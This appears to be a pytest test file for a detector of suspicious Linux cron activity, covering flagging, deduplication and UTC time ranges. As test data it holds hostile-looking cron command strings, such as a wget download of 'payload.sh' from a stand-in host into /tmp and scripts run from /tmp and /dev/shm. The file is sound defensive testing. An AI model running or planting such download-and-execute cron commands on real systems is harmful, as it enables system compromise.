from src.detection.linux.cron_activity_detector import (
    detect_suspicious_cron_activity,
)
from src.models.linux_event import LinuxEvent

import pytest


def create_cron_event(
    message: str,
    hostname: str = "ubuntu-server",
) -> LinuxEvent:
    return LinuxEvent(
        timestamp="Jul  7 09:01:01",
        hostname=hostname,
        service="cron",
        process="CRON",
        pid="2301",
        message=message,
        action="cron_execute",
        status="success",
    )


def test_detect_cron_tmp_execution():
    events = [
        create_cron_event(
            "(root) CMD (/usr/bin/python3 /tmp/update.py)"
        )
    ]

    findings = detect_suspicious_cron_activity(events)

    assert len(findings) == 1
    assert findings[0].title == "Suspicious Cron Activity Detected"
    assert findings[0].severity == "high"
    assert findings[0].hostname == "ubuntu-server"


def test_detect_cron_wget_download():
    events = [
        create_cron_event(
            "(root) CMD (wget http://example.test/payload.sh -O /tmp/a.sh)"
        )
    ]

    findings = detect_suspicious_cron_activity(events)

    assert len(findings) == 1


def test_detect_cron_dev_shm_execution():
    events = [
        create_cron_event(
            "(root) CMD (/bin/sh /dev/shm/run.sh)"
        )
    ]

    findings = detect_suspicious_cron_activity(events)

    assert len(findings) == 1


def test_ignore_normal_cron_activity():
    events = [
        create_cron_event(
            "(root) CMD (/usr/bin/updatedb)"
        )
    ]

    findings = detect_suspicious_cron_activity(events)

    assert findings == []


def test_ignore_non_cron_event():
    events = [
        LinuxEvent(
            service="sudo",
            message="wget http://example.test/payload.sh",
            action="command",
            status="success",
        )
    ]

    findings = detect_suspicious_cron_activity(events)

    assert findings == []


def test_deduplicate_identical_cron_events():
    message = "(root) CMD (wget http://example.test/payload.sh -O /tmp/a.sh)"

    events = [
        create_cron_event(message),
        create_cron_event(message),
    ]

    findings = detect_suspicious_cron_activity(events)

    assert len(findings) == 1


def _cron_with_utc(
    message: str,
    timestamp_utc: str | None,
    hostname: str = "ubuntu-server",
) -> LinuxEvent:
    event = create_cron_event(
        message=message,
        hostname=hostname,
    )
    event.timestamp_utc = timestamp_utc
    return event


def test_cron_activity_finding_preserves_utc_time():
    event = _cron_with_utc(
        "(root) CMD (/usr/bin/python3 /tmp/update.py)",
        "2026-07-07T06:01:01.123456789+00:00",
    )

    findings = detect_suspicious_cron_activity([event])

    assert len(findings) == 1

    finding = findings[0]

    assert finding.title == "Suspicious Cron Activity Detected"
    assert finding.severity == "high"
    assert finding.first_seen == (
        "2026-07-07T06:01:01.123456789+00:00"
    )
    assert finding.last_seen == (
        "2026-07-07T06:01:01.123456789+00:00"
    )

    # Preserve original Linux syslog timestamp.
    assert event.timestamp == "Jul  7 09:01:01"


def test_cron_deduplicated_finding_preserves_time_range():
    message = "(root) CMD (/usr/bin/python3 /tmp/update.py)"

    events = [
        _cron_with_utc(
            message,
            "2026-07-07T06:01:03+00:00",
        ),
        _cron_with_utc(
            message,
            "2026-07-07T06:01:01.100000001+00:00",
        ),
        _cron_with_utc(
            message,
            "2026-07-07T06:01:01.1+00:00",
        ),
        # Same command on another host:
        # a separate detection group.
        _cron_with_utc(
            message,
            "2026-07-07T05:00:00+00:00",
            hostname="other-server",
        ),
        # Non-Cron event must not affect time ranges.
        LinuxEvent(
            service="sudo",
            hostname="ubuntu-server",
            message=message,
            timestamp_utc="2026-07-07T04:00:00+00:00",
        ),
    ]

    findings = detect_suspicious_cron_activity(events)

    assert len(findings) == 2

    findings_by_host = {
        finding.hostname: finding
        for finding in findings
    }

    main_finding = findings_by_host["ubuntu-server"]

    assert main_finding.first_seen == (
        "2026-07-07T06:01:01.1+00:00"
    )
    assert main_finding.last_seen == (
        "2026-07-07T06:01:03+00:00"
    )

    other_finding = findings_by_host["other-server"]

    assert other_finding.first_seen == (
        "2026-07-07T05:00:00+00:00"
    )
    assert other_finding.last_seen == (
        "2026-07-07T05:00:00+00:00"
    )


@pytest.mark.parametrize(
    "unreliable_time",
    [
        None,
        "invalid timestamp",
    ],
)


def test_cron_deduplicated_finding_rejects_incomplete_time(
    unreliable_time,
):
    message = "(root) CMD (/usr/bin/python3 /tmp/update.py)"

    events = [
        _cron_with_utc(
            message,
            "2026-07-07T06:01:01+00:00",
        ),
        _cron_with_utc(
            message,
            unreliable_time,
        ),
    ]

    findings = detect_suspicious_cron_activity(events)

    assert len(findings) == 1

    finding = findings[0]

    assert finding.first_seen is None
    assert finding.last_seen is None
